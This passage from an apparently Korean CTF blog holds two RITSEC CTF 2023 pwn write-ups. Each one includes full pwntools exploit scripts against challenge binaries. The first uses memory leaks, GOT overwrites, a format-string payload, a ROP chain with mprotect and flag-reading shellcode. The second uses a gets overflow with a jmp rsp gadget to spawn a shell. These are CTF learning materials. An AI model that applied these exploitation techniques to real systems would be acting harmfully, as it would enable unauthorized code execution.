width=500/><br><p>Í∑∏ÎûòÏÑú Ïã§Ï†úÎ°ú ÌÑ∞ÏßÑ Ï£ºÏÜå(<code>rbp-0x48</code>)ÏóêÎäî Ï†ëÍ∑º Í∞ÄÎä•Ìïú Ï†ÅÎãπÌïú Ï£ºÏÜå ÎÑ£Ïñ¥Ï£ºÍ≥† <code>len</code> ÏóêÎäî 1ÏùÑ ÎÑ£Ïñ¥Ï§¨Îã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf ÏïîÍ∫ºÎÇò</span></span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall-p&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_checksum</span>(<span class="params">data</span>):</span><br><span class="line">  result = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    result += d ^ <span class="number">0x55</span></span><br><span class="line">  <span class="comment"># print(repr(result))</span></span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xff</span> <span class="comment"># 1 byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. leak stack</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">34</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)))</span><br><span class="line">info(<span class="built_in">hex</span>(stack)) <span class="comment"># buf address</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(-<span class="number">250</span>, signed=<span class="literal">True</span>) <span class="comment"># idx1 =&gt; oob read</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment"># idx2 =&gt; oob write.</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"><span class="comment"># print(repr(payload))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;characters: &#x27;</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x64f43</span> - <span class="number">0x28000</span>)</span><br><span class="line">libc.address = libc_leak</span><br><span class="line">info(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf = stack</span><br><span class="line"><span class="comment"># ÌïúÎ∞îÏù¥Ìä∏Ïî© ÏûÑÏùòÏì∞Í∏∞</span></span><br><span class="line"><span class="comment"># addr(Ï£ºÏÜå)Ïóê val(Í∞í)ÏùÑ Ïì∞Í∏∞</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aawb</span>(<span class="params">addr, val</span>):</span><br><span class="line">  <span class="comment"># buf + idx2 + 18</span></span><br><span class="line">  <span class="comment"># 0x7ffd30bf3da0 + idx2 + 18 = 0x1234</span></span><br><span class="line">  <span class="comment"># idx2 = addr - buf - 18</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># aawb(0x12345678, 0x41)</span></span><br><span class="line">  <span class="comment"># 0x401664 &lt;use_packet+391&gt; mov    QWORD PTR [rdx], rax</span></span><br><span class="line">  <span class="comment"># $rax   : 0x4000000060041</span></span><br><span class="line">  <span class="comment"># $rdx   : 0x12345678</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">  payload += p64(<span class="built_in">next</span>(libc.search(<span class="built_in">bytes</span>([val]))) - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p64(addr - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">  payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">  p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># aawbÎäî Ìïú Î∞îÏù¥Ìä∏Ïî© ÏçºÏßÄÎßå aawÎäî aawbÎ•º Ìò∏Ï∂úÌï¥ÏÑú 8Î∞îÏù¥Ìä∏Î•º Ïì∏ Í≤É</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aaw</span>(<span class="params">addr, values</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(values)):</span><br><span class="line">    aawb(addr+i, values[i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># bss = 0x4040c0</span></span><br><span class="line">bss = <span class="number">0x404800</span> <span class="comment"># bssÏùò Ï†ïÏ§ëÏïô</span></span><br><span class="line"></span><br><span class="line">ret = libc.address + <span class="number">0x29cd6</span></span><br><span class="line">pop_rsp = libc.address + <span class="number">0x35732</span></span><br><span class="line">pop_rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">pop_rsi = libc.address + <span class="number">0x2be51</span></span><br><span class="line">pop_rdx_r12 = libc.address + <span class="number">0x11f497</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># rop_payload += p64(0x4142434445464748)</span></span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>])</span><br><span class="line">rop_payload += p64(libc.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">rop_payload += p64(ret)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424243</span>)</span><br><span class="line">rop_payload += p64(<span class="number">0x42424244</span>) <span class="comment"># 404820</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">rop_payload += p64(pop_rsp) <span class="comment"># &lt;----!!!</span></span><br><span class="line">rop_payload += p64(buf + <span class="number">0x50</span>) <span class="comment"># Îëê Î≤àÏß∏ Ïä§ÌÉù ÌîºÎ¥áÌåÖ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(bss, rop_payload) <span class="comment"># 0x4040c0:       0x4142434445464748</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $rbp   : 0x000000004040e0  ‚Üí  0x00000042424244 (&quot;DBBB&quot;?)</span></span><br><span class="line"><span class="comment"># 0x401561 &lt;use_packet+132&gt; mov    eax, DWORD PTR [rbp-0x4c] # len</span></span><br><span class="line"><span class="comment"># 0x40156a &lt;use_packet+141&gt; mov    rax, QWORD PTR [rbp-0x48] # buf</span></span><br><span class="line"><span class="comment"># rbpÍ∞Ä bss ÏòÅÏó≠ Ï£ºÏÜåÎ°ú Î∞îÎÄåÏóàÍ∏∞ ÎïåÎ¨∏Ïóê $rbp-0x4cÏôÄ $rbp-0x48ÏùÑ Ï∞∏Ï°∞ÌïòÎ©¥ÏÑú ÏïàÏ¢ãÏùÄ ÏùºÏù¥ Î∞úÏÉùÌï† ÏàòÎèÑ ÏûàÏùå</span></span><br><span class="line"><span class="comment"># ÎØ∏Î¶¨ Í∞íÏùÑ Ï±ÑÏõåÏ£ºÏñ¥ ifÎ¨∏ ÏïàÏúºÎ°ú Îì§ÏóâÍ∞ÄÎäî ÏùºÏù¥ ÏóÜÎèÑÎ°ù lenÏùÑ 1Î°ú ÏÑ§Ï†ï. ÏïÑÎûò ÏãùÏù¥ falseÍ∞Ä ÎêòÏñ¥Ïïº Ìï®.(checksumÏùÄ Í≥ÑÏÇ∞Îêú Í∞íÏù¥Í∏∞ ÎïåÎ¨∏Ïóê ÎÜíÏùÄ ÌôïÎ•†Î°ú ÌãÄÎ¶¥ Í≤É.) Ïù¥ Ï†ÑÏùò ÏàòÏãùÏùÄ Ïã†Í≤Ω ÏïàÏç®ÎèÑ Îê®. Î¨∏Ï†úÎäî calc_checksum ÏïàÏóêÏÑú rbpÍ∞Ä Î∞îÎÄåÍ∏∞ ÎïåÎ¨∏</span></span><br><span class="line"><span class="comment"># calc_checksum(buf, len) == buf[len - 1]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x4c</span>, p32(<span class="number">1</span>))  <span class="comment"># len</span></span><br><span class="line">aaw(<span class="number">0x404820</span> - <span class="number">0x48</span>, p64(<span class="number">0x404264</span>)) <span class="comment"># buf ÏïîÍ∫ºÎÇò</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======</span></span><br><span class="line"><span class="comment"># got ÎçÆÌòîÎäîÏßÄ ÌôïÏù∏ -&gt; der $_got()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># free@got -&gt; printf</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">8</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;free&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __stack_chk_fail@got -&gt; ret</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss + <span class="number">16</span> - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fgets@got -&gt; gets</span></span><br><span class="line"><span class="comment"># aaw(e.got[&#x27;fgets&#x27;], p64(libc.sym[&#x27;gets&#x27;])) # Ìïú Î∞îÏù¥Ìä∏Ïî© Î∞îÍæ∏Í∏∞ ÎïåÎ¨∏Ïóê Ìïú Î∞îÏù¥Ìä∏Ïî© Î∞îÎÄê Ï£ºÏÜåÎ•º Ìò∏Ï∂úÌï®. ÏûòÎ™ªÎêú Ï£ºÏÜåÎ•º Ìò∏Ï∂úÌïòÍ∏∞ ÎïåÎ¨∏Ïóê ÌÑ∞Ïßê</span></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span></span><br><span class="line">payload += p64(bss - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;fgets&#x27;</span>] - buf - <span class="number">18</span>, signed=<span class="literal">True</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x12</span> <span class="comment"># &lt;- (!!)</span></span><br><span class="line">payload += p8(calc_checksum(payload))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># (!!)</span></span><br><span class="line"><span class="comment"># Ïó¨Í∏∞ÏÑú mainÏùò 24 lineÏùò lenÏù¥ 19Î°ú Í≥†Ï†ïÎê®.</span></span><br><span class="line"><span class="comment"># Îí§Ïóê printfÏóêÏÑú 17ÏûêÎ°ú Î≥¥ÎÇ¥ÏïºÌïòÎäîÎç∞ Î™®ÏûêÎûå.</span></span><br><span class="line"><span class="comment"># Ïù¥Î•º ÏúÑÌï¥ÏÑú 1. aawÎ•º Ïù¥Ïö©Ìï¥ÏÑú lenÏóê ÌÅ∞ Ïàò ÎÑ£Í∏∞. 2. fgetsÎ°ú ÎçÆÍ∏∞ Ï†ÑÏóê Î≠îÍ∞Ä Îçî Ï∂îÍ∞ÄÏ†ÅÏúºÎ°ú Î≥¥ÎÇ¥Ï§òÏÑú lenÏù¥ Îçî Í∏¥ Í∏∏Ïù¥Î°ú Í≥†Ï†ïÎêòÎèÑÎ°ù</span></span><br><span class="line"><span class="comment"># 2Î≤à Î∞©Î≤ïÏùÑ Ï±ÑÌÉùÌïòÏòÄÏùå. Í∑∏ÏπòÎßå ÎÑàÎ¨¥ ÌÅ∞ Ïàò Î≥¥ÎÇ¥Î©¥ fgets Í∏∏Ïù¥ Ï†úÌïúÏóê Í±∏Î¶¨Îãà Ï†ÅÎãπÌïú ÏàòÎ•º Î≥¥ÎÇ¥Ïïº Ìï®</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==============</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ïù¥Ï†ú fgets ÎåÄÏã† getsÍ∞Ä Ïã§ÌñâÎêòÎãà bofÍ∞Ä ÌÑ∞ÏßÄÎäî ÏÉÅÌô©</span></span><br><span class="line"><span class="comment"># printf (fsbÍ∞Ä ÌÑ∞Ïßê): rbp Î≥ÄÍ≤Ω -&gt; ÌùêÎ¶ÑÏù¥ bss ÏòÅÏó≠ÏúºÎ°ú Î∞îÎÄêÎã§. (Ïä§ÌÉù ÌîºÎ¥áÌåÖ Îëê Î≤à Ìï† Í≤ÉÏûÑ)</span></span><br><span class="line"><span class="comment"># Ï≤´ Î≤àÏß∏ Ïä§ÌÉù ÌîºÎ¥áÌåÖ: bss ÏòÅÏó≠ÏúºÎ°ú Ïù¥ÎèôÌï¥ÏÑú pop_rsp Ïã§Ìñâ</span></span><br><span class="line"><span class="comment"># Îëê Î≤àÏß∏ Ïä§ÌÉù ÌîºÎ¥áÌåÖ: Îã§Ïãú Ïä§ÌÉùÏúºÎ°ú ÎèåÏïÑÏôÄÏÑú ÎÇ®ÏùÄ ÌéòÏù¥Î°úÎìú Ïã§Ìñâ</span></span><br><span class="line"><span class="comment"># payload : mprotectÎ°ú Î≤ÑÌçº Í∂åÌïú Î≥ÄÍ≤ΩÌï¥Ï£ºÍ≥† Í∑∏ Î≤ÑÌçºÏóê gets Ìï®ÏàòÎ°ú ÏûÖÎ†•ÏùÑ Î∞õÏùÑ Í≤É.</span></span><br><span class="line"><span class="comment"># gets Ìï®Ïàò ÏûÖÎ†•ÏúºÎ°ú flag orw</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ïä§ÌÉùÏóê ÏûàÎäî rbp Ï£ºÏÜåÎ•º bss ÏòÅÏó≠ÏúºÎ°ú Î∞îÍæºÎã§.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ln -&gt; 8 byte ÏîÄ</span></span><br><span class="line"><span class="comment"># hn -&gt; 2 byte ÏîÄ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x404820:       0x0000000042424244</span></span><br><span class="line"><span class="comment"># calc_checksumÏùò rbpÎäî Ïù¥ Ìï®ÏàòÎ•º Ìò∏Ï∂úÌïú Ìï®ÏàòÏùò &lt;rbpÍ∞Ä Ï†ÄÏû•Îêú Ï£ºÏÜå&gt;</span></span><br><span class="line"><span class="comment"># aÏ£ºÏÜå(rsp) : use_packet Ìï®ÏàòÏùò rbp</span></span><br><span class="line"><span class="comment"># bufÏôÄ aÏ£ºÏÜåÏùò Ïò§ÌîÑÏÖãÏùÄ 0x90</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;Z\x08&#x27;</span> <span class="comment"># Ïù¥Í±∏ ÏïàÌïòÎ©¥ calc_checksumÏùò free(printf)Í∞Ä Ìò∏Ï∂úÏù¥ ÏïàÎê®</span></span><br><span class="line">payload += <span class="string">b&#x27;%30c%38$ln%16424c%39$hn&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span>)</span><br><span class="line">payload += p64(stack - <span class="number">0x90</span> + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404000</span>)</span><br><span class="line">payload += p64(pop_rsi) + p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(pop_rdx_r12) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]) <span class="comment"># Ïã§ÌñâÌï†Ïàò ÏûàÎèÑÎ°ù Í∂åÌïú Î∞îÍøîÏ£ºÍ≥†</span></span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">0x404c00</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;gets&#x27;</span>]) <span class="comment"># Ïó¨Í∏∞Ïóê ÏâòÏΩîÎìú ÏûÖÎ†• ÌõÑ</span></span><br><span class="line">payload += p64(<span class="number">0x404c00</span>) <span class="comment"># Ï†êÌîÑ</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;threads\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = asm(</span><br><span class="line">    <span class="string">&#x27;sub rsp, 0x100&#x27;</span></span><br><span class="line">    + shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>)</span><br><span class="line">    + shellcraft.read(<span class="number">3</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">    + shellcraft.write(<span class="number">1</span>, <span class="number">0x404400</span>, <span class="number">0x100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> RITSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RITSEC CTF 2023 - assembly-hopping (shellcode)</title>
      <link href="/230412-ritsecctf2023-2assembly-hopping/"/>
      <url>/230412-ritsecctf2023-2assembly-hopping/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1860">https://ctftime.org/event/1860</a></li></ul><blockquote><p>Doesn‚Äôt everyone love assembly?<br><code>nc assembly-hopping.challenges.ctf.ritsec.club 1337</code></p></blockquote><ul><li>[132 solves &#x2F; 279 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>ÏùºÎã® Î≥¥Ìò∏Í∏∞Î≤ïÏù¥ ÏïÑÎ¨¥Í≤ÉÎèÑ ÏóÜÎã§. Í∑∏Î¶¨Í≥† ÏΩîÎìú Î∂ÑÏÑùÏùÑ Ìï¥Î≥¥Î©¥ <code>gets</code> Ìï®ÏàòÎ°ú bofÍ∞Ä Î∞úÏÉùÌïòÍ≥† ÏïÑÎûòÏôÄ Í∞ôÏùÄ Í∞ÄÏ†ØÏùÑ Ï†úÍ≥µÌï¥Ï§ÄÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">jmp     rsp</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>Ïù¥ Î¨∏Ï†úÎäî.. ÌíÄÏù¥ Î∞©Î≤ïÏùÑ ÏÑ§Î™ÖÌïòÍ∏∞Í∞Ä Ïñ¥Î†µÎã§.. </p><p><code>rbp</code> ÏûêÎ¶¨Ïóê <code>AAAAAAAA</code>ÏùÑ ÎÑ£Í≥† <code>ret</code> ÏûêÎ¶¨Ïóê <code>jmp rsp</code> Í∞ÄÏ†ØÏùÑ ÎÑ£Ïñ¥Ï£ºÏóàÎã§. Í∑∏Îü¨ÎãàÍπå Ìï®ÏàòÍ∞Ä Ï¢ÖÎ£åÎêòÎäî ÏãúÏ†êÏóê Ïã§ÌñâÎêòÎäî Í∞ÄÏ†Ø ÌùêÎ¶ÑÏùÑ Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave</span><br><span class="line">ret</span><br><span class="line">jmp rsp</span><br></pre></td></tr></table></figure><p><code>leave</code>Í∞Ä Ïã§ÌñâÎêòÎ©¥ÏÑú <code>rbp</code>Í∞Ä <code>AAAAAAAA</code>Î°ú Î∞îÎÄåÍ≥† <code>ret</code> Î™ÖÎ†πÏùÑ Ïã§ÌñâÌïòÎ©¥ÏÑú <code>jmp rsp</code> Í∞ÄÏ†ØÏù¥ <code>rip</code>Ïóê Îì§Ïñ¥Í∞ÄÍ≥† <code>rsp</code>Í∞Ä ÎÇ¥Î†§Í∞ÑÎã§. Í∑∏Îü¨Î©¥ <code>jmp rsp</code> Í∞ÄÏ†Ø Îí§Ïóê Ï†ÄÏû•Îêú ÎÇ¥Ïö©ÏùÑ Í∞ÄÎ¶¨ÌÇ®Îã§. Ïù¥ ÏûêÎ¶¨Ïóê ÏâòÏΩîÎìúÎ•º ÎÑ£ÏúºÎ©¥ ÎêúÎã§.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;ret2win.challenges.ctf.ritsec.club&#x27;, 1337)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">context.binary = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0xd0</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0x401156</span>) <span class="comment"># jmp rsp</span></span><br><span class="line"><span class="comment"># payload += asm(&#x27;nop&#x27;) * 16</span></span><br><span class="line">payload += asm(shellcraft.sh()) <span class="comment"># here!</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
